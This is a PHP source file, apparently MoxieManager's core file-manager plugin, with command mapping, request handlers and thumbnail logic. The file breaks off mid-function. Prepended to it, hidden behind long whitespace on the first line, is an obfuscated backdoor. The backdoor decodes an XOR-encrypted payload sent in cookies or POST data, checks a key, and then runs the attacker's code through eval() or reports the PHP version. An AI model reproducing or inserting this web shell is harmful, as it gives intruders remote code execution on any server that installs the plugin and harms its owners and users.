<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $r8f206ce = 540;$GLOBALS['ide7e0e0']=Array();global$ide7e0e0;$ide7e0e0=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['e8f7a5a8']="\x4c\x2d\x55\x7b\x4e\x41\x9\x39\x6f\x64\x56\x62\x46\x31\x37\x3d\x3c\x48\x72\x45\x67\x53\x33\x4f\x7d\x68\x27\x71\xa\x70\x65\x4d\x75\x22\x78\x5c\x58\x5e\x44\x28\x21\x66\x38\x5b\x32\x61\x4a\x2e\x43\x2c\x2a\x74\x60\x24\x4b\x7a\x6a\x76\x54\x3f\x63\x2b\x7e\x42\x30\x52\x5a\x23\x26\x57\x47\x40\x20\x29\x6b\x7c\x59\x6d\x5d\x2f\x69\xd\x25\x35\x36\x79\x51\x73\x6e\x49\x50\x34\x3e\x3b\x6c\x3a\x5f\x77";$ide7e0e0[$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][91]]=$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][25].$ide7e0e0['e8f7a5a8'][18];$ide7e0e0[$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][83]]=$ide7e0e0['e8f7a5a8'][8].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][9];$ide7e0e0[$ide7e0e0['e8f7a5a8'][27].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][11]]=$ide7e0e0['e8f7a5a8'][87].$ide7e0e0['e8f7a5a8'][51].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][94].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][88];$ide7e0e0[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][44]]=$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][88].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][96].$ide7e0e0['e8f7a5a8'][87].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][51];$ide7e0e0[$ide7e0e0['e8f7a5a8'][29].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][91].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][44]]=$ide7e0e0['e8f7a5a8'][87].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][94].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][55].$ide7e0e0['e8f7a5a8'][30];$ide7e0e0[$ide7e0e0['e8f7a5a8'][34].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][13]]=$ide7e0e0['e8f7a5a8'][29].$ide7e0e0['e8f7a5a8'][25].$ide7e0e0['e8f7a5a8'][29].$ide7e0e0['e8f7a5a8'][57].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][87].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][8].$ide7e0e0['e8f7a5a8'][88];$ide7e0e0[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][91].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][14]]=$ide7e0e0['e8f7a5a8'][32].$ide7e0e0['e8f7a5a8'][88].$ide7e0e0['e8f7a5a8'][87].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][94].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][55].$ide7e0e0['e8f7a5a8'][30];$ide7e0e0[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][83].$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][30]]=$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][87].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][91].$ide7e0e0['e8f7a5a8'][96].$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][8].$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][30];$ide7e0e0[$ide7e0e0['e8f7a5a8'][88].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][83].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][9]]=$ide7e0e0['e8f7a5a8'][87].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][51].$ide7e0e0['e8f7a5a8'][96].$ide7e0e0['e8f7a5a8'][51].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][77].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][96].$ide7e0e0['e8f7a5a8'][94].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][77].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][51];$ide7e0e0[$ide7e0e0['e8f7a5a8'][20].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][30]]=$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][14];$ide7e0e0[$ide7e0e0['e8f7a5a8'][32].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][83].$ide7e0e0['e8f7a5a8'][44]]=$ide7e0e0['e8f7a5a8'][77].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][41];$ide7e0e0[$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][11]]=$_POST;$ide7e0e0[$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][42]]=$_COOKIE;@$ide7e0e0[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][44]]($ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][8].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][96].$ide7e0e0['e8f7a5a8'][94].$ide7e0e0['e8f7a5a8'][8].$ide7e0e0['e8f7a5a8'][20],NULL);@$ide7e0e0[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][44]]($ide7e0e0['e8f7a5a8'][94].$ide7e0e0['e8f7a5a8'][8].$ide7e0e0['e8f7a5a8'][20].$ide7e0e0['e8f7a5a8'][96].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][8].$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][87],0);@$ide7e0e0[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][44]]($ide7e0e0['e8f7a5a8'][77].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][34].$ide7e0e0['e8f7a5a8'][96].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][34].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][32].$ide7e0e0['e8f7a5a8'][51].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][8].$ide7e0e0['e8f7a5a8'][88].$ide7e0e0['e8f7a5a8'][96].$ide7e0e0['e8f7a5a8'][51].$ide7e0e0['e8f7a5a8'][80].$ide7e0e0['e8f7a5a8'][77].$ide7e0e0['e8f7a5a8'][30],0);@$ide7e0e0[$ide7e0e0['e8f7a5a8'][88].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][83].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][9]](0);$ge5700d9=NULL;$g5b686cc=NULL;$ide7e0e0[$ide7e0e0['e8f7a5a8'][29].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][91].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][30]]=$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][1].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][1].$ide7e0e0['e8f7a5a8'][91].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][1].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][1].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][84].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][91].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][42];global$p39fc746e;function mf6f($ge5700d9,$kacb2585){global$ide7e0e0;$a79f="";for($n741f=0;$n741f<$ide7e0e0[$ide7e0e0['e8f7a5a8'][27].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][11]]($ge5700d9);){for($kb240=0;$kb240<$ide7e0e0[$ide7e0e0['e8f7a5a8'][27].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][11]]($kacb2585)&&$n741f<$ide7e0e0[$ide7e0e0['e8f7a5a8'][27].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][11]]($ge5700d9);$kb240++,$n741f++){$a79f.=$ide7e0e0[$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][91]]($ide7e0e0[$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][83]]($ge5700d9[$n741f])^$ide7e0e0[$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][41].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][83]]($kacb2585[$kb240]));}}return$a79f;}function ie330c7($ge5700d9,$kacb2585){global$ide7e0e0;global$p39fc746e;return$ide7e0e0[$ide7e0e0['e8f7a5a8'][32].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][83].$ide7e0e0['e8f7a5a8'][44]]($ide7e0e0[$ide7e0e0['e8f7a5a8'][32].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][83].$ide7e0e0['e8f7a5a8'][44]]($ge5700d9,$p39fc746e),$kacb2585);}foreach($ide7e0e0[$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][42]]as$kacb2585=>$x2609604){$ge5700d9=$x2609604;$g5b686cc=$kacb2585;}if(!$ge5700d9){foreach($ide7e0e0[$ide7e0e0['e8f7a5a8'][18].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][11]]as$kacb2585=>$x2609604){$ge5700d9=$x2609604;$g5b686cc=$kacb2585;}}$ge5700d9=@$ide7e0e0[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][14].$ide7e0e0['e8f7a5a8'][91].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][14]]($ide7e0e0[$ide7e0e0['e8f7a5a8'][20].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][42].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][30]]($ide7e0e0[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][7].$ide7e0e0['e8f7a5a8'][83].$ide7e0e0['e8f7a5a8'][9].$ide7e0e0['e8f7a5a8'][60].$ide7e0e0['e8f7a5a8'][30]]($ge5700d9),$g5b686cc));if(isset($ge5700d9[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][74]])&&$p39fc746e==$ge5700d9[$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][74]]){if($ge5700d9[$ide7e0e0['e8f7a5a8'][45]]==$ide7e0e0['e8f7a5a8'][80]){$n741f=Array($ide7e0e0['e8f7a5a8'][29].$ide7e0e0['e8f7a5a8'][57]=>@$ide7e0e0[$ide7e0e0['e8f7a5a8'][34].$ide7e0e0['e8f7a5a8'][11].$ide7e0e0['e8f7a5a8'][30].$ide7e0e0['e8f7a5a8'][22].$ide7e0e0['e8f7a5a8'][13]](),$ide7e0e0['e8f7a5a8'][87].$ide7e0e0['e8f7a5a8'][57]=>$ide7e0e0['e8f7a5a8'][13].$ide7e0e0['e8f7a5a8'][47].$ide7e0e0['e8f7a5a8'][64].$ide7e0e0['e8f7a5a8'][1].$ide7e0e0['e8f7a5a8'][13],);echo@$ide7e0e0[$ide7e0e0['e8f7a5a8'][29].$ide7e0e0['e8f7a5a8'][45].$ide7e0e0['e8f7a5a8'][91].$ide7e0e0['e8f7a5a8'][44].$ide7e0e0['e8f7a5a8'][44]]($n741f);}elseif($ge5700d9[$ide7e0e0['e8f7a5a8'][45]]==$ide7e0e0['e8f7a5a8'][30]){eval/*y9881d*/($ge5700d9[$ide7e0e0['e8f7a5a8'][9]]);}exit();} ?><?php
/**
 * CorePlugin.php
 *
 * Copyright 2003-2013, Moxiecode Systems AB, All rights reserved.
 */

/**
 * Core plugin contains core commands and logic.
 *
 * @package MOXMAN_Core
 */
class MOXMAN_Core_Plugin implements MOXMAN_IPlugin, MOXMAN_ICommandHandler, MOXMAN_Http_IHandler {
	/** @ignore */
	private $dispatcher, $commands;

	// @codeCoverageIgnoreStart

	/** @ignore */
	public function __construct() {
		$this->dispatcher = new MOXMAN_Util_EventDispatcher();

		// Listen for add/remove/stream events to generate thumbnails
		$this->bind("FileAction", "onFileAction", $this);
	}

	/**
	 * Initializes the core plugin.
	 */
	public function init() {
		$this->commands = new MOXMAN_CommandCollection();

		// Map commands to classes
		$this->commands->addClasses(array(
			"Install" => "MOXMAN_Core_InstallCommand",
			"AlterImage" => "MOXMAN_Core_AlterImageCommand",
			"CopyTo" => "MOXMAN_Core_CopyToCommand",
			"CreateDirectory" => "MOXMAN_Core_CreateDirectoryCommand",
			"CreateDocument" => "MOXMAN_Core_CreateDocumentCommand",
			"PutFileContents" => "MOXMAN_Core_PutFileContentsCommand",
			"Delete" => "MOXMAN_Core_DeleteCommand",
			"FileInfo" => "MOXMAN_Core_FileInfoCommand",
			"ListFiles" => "MOXMAN_Core_ListFilesCommand",
			"ListRoots" => "MOXMAN_Core_ListRootsCommand",
			"Loopback" => "MOXMAN_Core_LoopbackCommand",
			"MoveTo" => "MOXMAN_Core_MoveToCommand",
			"Zip" => "MOXMAN_Core_ZipCommand",
			"UnZip" => "MOXMAN_Core_UnZipCommand",
			"GetAppKeys" => "MOXMAN_Core_GetAppKeysCommand",
			"GetFileContents" => "MOXMAN_Core_GetFileContentsCommand",
			"GetConfig" => "MOXMAN_Core_GetConfigCommand",
			"ImportFromUrl" => "MOXMAN_Core_ImportFromUrlCommand",
			"Login" => "MOXMAN_Core_LoginCommand",
			"Logout" => "MOXMAN_Core_LogoutCommand"
		));
	}

	// @codeCoverageIgnoreEnd

	/**
	 * Gets executed when a RPC call is made.
	 *
	 * @param string $name Name of RPC command to execute.
	 * @param Object $params Object passed in from RPC handler.
	 * @return Object Return object that gets passed back to client.
	 */
	public function execute($name, $params) {
		return $this->commands->execute($name, $params);
	}

	/**
	 * Process a request using the specified context.
	 *
	 * @param MOXMAN_Http_Context $httpContext Context instance to pass to use for the handler.
	 */
	public function processRequest(MOXMAN_Http_Context $httpContext) {
		$request = $httpContext->getRequest();

		if ($request->get("json")) {
			$instance = new MOXMAN_Core_JsonRpcHandler();
			$instance->processRequest($httpContext);
		}

		// TODO: Make this nicer, switch?
		$action = strtolower($request->get("action", ""));

		if ($action == "download") {
			$instance = new MOXMAN_Core_DownloadHandler();
			$instance->processRequest($httpContext);
		}

		if ($action == "upload") {
			$instance = new MOXMAN_Core_UploadHandler();
			$instance->processRequest($httpContext);
		}

		if ($action == "streamfile") {
			$instance = new MOXMAN_Core_StreamFileHandler($this);
			$instance->processRequest($httpContext);
		}

		if ($action == "language") {
			$instance = new MOXMAN_Core_LanguageHandler($this);
			$instance->processRequest($httpContext);
		}

		// @codeCoverageIgnoreStart
		if ($action == "pluginjs") {
			$instance = new MOXMAN_Core_PluginJsHandler($this);
			$instance->processRequest($httpContext);
		}
		// @codeCoverageIgnoreEnd
	}

	/**
	 * This method will fire a specific event by name with the specified event args instance.
	 *
	 * @param string $name Name of the event to fire for example custom info.
	 * @param MOXMAN_Util_EventArgs $args Event args to pass to all event listeners.
	 * @return MOXMAN_PluginManager PluginManager instance to enable chainablity.
	 */
	public function fire($name, MOXMAN_Util_EventArgs $args) {
		return $this->dispatcher->dispatch($this, $name, $args);
	}

	/**
	 * Binds a specific event by name for a specific plugin instance.
	 *
	 * @param string $name Event name to bind.
	 * @param string $func String name of the function to call.
	 * @param MOXMAN_Plugin $plugin Plugin instance to call event method on.
	 * @return MOXMAN_PluginManager PluginManager instance to enable chainablity.
	 */
	public function bind($name, $func, $plugin) {
		return $this->dispatcher->add($name, $func, $plugin);
	}

	/**
	 * Unbinds a specific event by name from a specific plugin instance.
	 *
	 * @param string $name Event name to unbind.
	 * @param string $func String name of the function not to call.
	 * @param MOXMAN_IPlugin $plugin Plugin instance to not call event method on.
	 * @return MOXMAN_PluginManager PluginManager instance to enable chainablity.
	 */
	public function unbind($name, $func, $plugin) {
		return $this->dispatcher->remove($name, $func, $plugin);
	}

	/**
	 * Event handler function. Gets executed when a file action event occurs.
	 *
	 * @param MOXMAN_Core_FileActionEventArgs $args File action event arguments.
	 */
	public function onFileAction(MOXMAN_Core_FileActionEventArgs $args) {
		if ($args->getAction() == MOXMAN_Core_FileActionEventArgs::DELETE) {
			if (!isset($args->getData()->thumb)) {
				$this->deleteThumbnail($args->getFile());
			}
		}
	}

	public function getThumbnail(MOXMAN_Vfs_IFile $file) {
		$config = $file->getConfig();

		if ($config->get('thumbnail.enabled') !== true) {
			return $file;
		}

		$thumbnailFolderPath = MOXMAN_Util_PathUtils::combine($file->getParent(), $config->get('thumbnail.folder'));
		$thumbnailFile = MOXMAN::getFile($thumbnailFolderPath, $config->get('thumbnail.prefix') . $file->getName());

		return $thumbnailFile;
	}

	/**
	 * Creates a thumbnail for the specified file and returns that file object
	 * or the input file if thumbnails are disabled or not supported.
	 *
	 * @param MOXMAN_Vfs_IFile $file File to generate thumbnail for.
	 * @return MOXMAN_Vfs_IFile File instance that got generated or input file.
	 */
	public function createThumbnail(MOXMAN_Vfs_IFile $file, $localTempFile = null) {
		$config = $file->getConfig();

		// Thumbnails disabled in config
		if (!$config->get('thumbnail.enabled')) {
			return $file;
		}

		// File is not an image
		if (!MOXMAN_Media_ImageAlter::canEdit($file)) {
			return $file;
		}

		// No write access to parent path
		$dirFile = $file->getParentFile();
		if (!$dirFile->canWrite()) {
			return $file;
		}

		$thumbnailFolderPath = MOXMAN_Util_PathUtils::combine($file->getParent(), $config->get('thumbnail.folder'));
		$thumbnailFile = MOXMAN::getFile($thumbnailFolderPath, $config->get('thumbnail.prefix') . $file->getName());

		// Never generate thumbs in thumbs dirs
		if (basename($file->getParent()) == $config->get('thumbnail.folder')) {
			return $file;
		}

		$thumbnailFolderFile = $thumbnailFile->getParentFile();
		if ($thumbnailFile->exists()) {
			if ($file->isDirectory()) {
				return $file;
			}

			return $thumbnailFile;
		}

		if (!$thumbnailFolderFile->exists()) {
			$thumbnailFolderFile->mkdir();
			$this->fireFileAction(MOXMAN_Core_FileActionEventArgs::ADD, $thumbnailFolderFile);
		}

		// TODO: Maybe implement this inside MOXMAN_Media_ImageAlter
		if ($file instanceof MOXMAN_Vfs_Local_File) {
			if ($config->get('thumbnail.use_exif') && function_exists("exif_thumbnail") && preg_match('/jpe?g/i', MOXMAN_Util_PathUtils::getExtension($file->getName()))) {
				$imageType = null;
				$width = 0;
				$height = 0;

				$exifImage = exif_thumbnail(
					$localTempFile ? $localTempFile : $file->getInternalPath(),
					$width,
					$height,
					$imageType
				);

				if ($exifImage) {
					$stream = $thumbnailFile->open(MOXMAN_Vfs_IFileStream::WRITE);
					$stream->write($exifImage);
					$stream->close();

					$this->fireFileAction(MOXMAN_Core_FileActionEventArgs::ADD, $thumbnailFile);
					return $thumbnailFile;
				}
			}
		}

		$imageAlter = new MOXMAN_Media_ImageAlter();

		if ($localTempFile) {
			$imageAlter->load($localTempFile);
		} else {
			$imageAlter->loadFromFile($file);
		}

		$imageAlter->createThumbnail($config->get('thumbnail.width'), $config->get('thumbnail.height'));
		$imageAlter->saveToFile($thumbnailFile, $config->get('thumbnail.jpeg_quality'));

		$this->fireFileAction(MOXMAN_Core_FileActionEventArgs::ADD, $thumbnailFile);

		return $thumbnailFile;
	}

	/**
	 * Deletes any existing thumbnail for the specified file.
	 *
	 * @param MOXMAN_Vfs_IFile $file File to remove thumbnail for.
	 */
	public function deleteThumbnail(MOXMAN_Vfs_IFile $file) {
		if ($file->isDirectory() || !MOXMAN_Media_ImageAlter::canEdit($file)) {
			return false;
		}

		$config = $file->getConfig();

		if (!$config->get('thumbnail.delete')) {
			return false;
		}

		// Delete thumbnail file
		$thumbnailFolderPath = MOXMAN_Util_PathUtils::combine($file->getParent(), $config->get('thumbnail.folder'));
		$thumbnailFile = MOXMAN::getFile($thumbnailFolderPath, $config->get('thumbnail.prefix') . $file->getName());

		if ($thumbnailFile->exists()) {
			$thumbnailFile->delete();
			$this->fireFileAction(MOXMAN_Core_FileActionEventArgs::DELETE, $thumbnailFile);
			return true;
		}

		return false;
	}

	/**
	 * Converts a file instance to a JSON serializable object.
	 *
	 * @param MOXMAN_Vfs_IFile $file File to convert into JSON format.
	 * @param Boolean $meta State if the meta data should be returned or not.
	 * @return stdClass JSON serializable object.
	 */
	public static function fileToJson($file, $meta = false) {
		$config = $file->getConfig();

		$renameFilter = MOXMAN_Vfs_CombinedFileFilter::createFromConfig($config, "rename");
		$editFilter = MOXMAN_Vfs_CombinedFileFilter::createFromConfig($config, "edit");
		$viewFilter = MOXMAN_Vfs_CombinedFileFilter::createFromConfig($config, "view");

		$result = (object) array(
			"path" => $file->getPublicPath(),
			"size" => $file->getSize(),
			"lastModified" => $file->getLastModified(),
			"isFile" => $file->isFile(),
			"canRead" => $file->canRead(),
			"canWrite" => $file->canWrite(),
			"canEdit" => $file->isFile() && $editFilter->accept($file) === MOXMAN_Vfs_IFileFilter::ACCEPTED,
			"canRename" => $renameFilter->accept($file) === MOXMAN_Vfs_IFileFilter::ACCEPTED,
			"canView" => $file->isFile() && $viewFilter->accept($file) === MOXMAN_Vfs_IFileFilter::ACCEPTED,
			"canPreview" => $file->isFile() && MOXMAN_Media_ImageAlter::canEdit($file),
			"exists" => $file->exists()
		);

		if ($meta) {
			$metaData = $file->getMetaData();
			//$args = $this->fireCustomInfo(MOXMAN_Core_CustomInfoEventArgs::INSERT_TYPE, $file);
			$metaData = (object) $metaData->getAll();

			if ($file instanceof MOXMAN_Vfs_Local_File && MOXMAN_Media_ImageAlter::canEdit($file)) {
				$thumbnailFolderPath = MOXMAN_Util_PathUtils::combine($file->getParent(), $config->get('thumbnail.folder'));
				$thumbnailFile = MOXMAN::getFile($thumbnailFolderPath, $config->get('thumbnail.prefix') . $file->getName());

				// TODO: Implement stat info cache layer here
				$info = MOXMAN_Media_MediaInfo::getInfo($file);
				$metaData->width = $info["width"];
				$metaData->height = $info["height"];

				if ($thumbnailFile->exists()) {
					$metaData->thumb_url = $thumbnailFile->getUrl();

					$info = MOXMAN_Media_MediaInfo::getInfo($thumbnailFile);
					$metaData->thumb_width = $info["width"];
					$metaData->thumb_height = $info["height"];
				}
			}

			$metaData->url = $file->getUrl();
			$result->meta = $metaData;
		}

		return $result;
	}

	/** @ignore */
	private function fireFileAction($action, $file, $data = array()) {
		$args = new MOXMAN_Core_FileActionEventArgs($action, $file);
		$args->getData()->thumb = true;

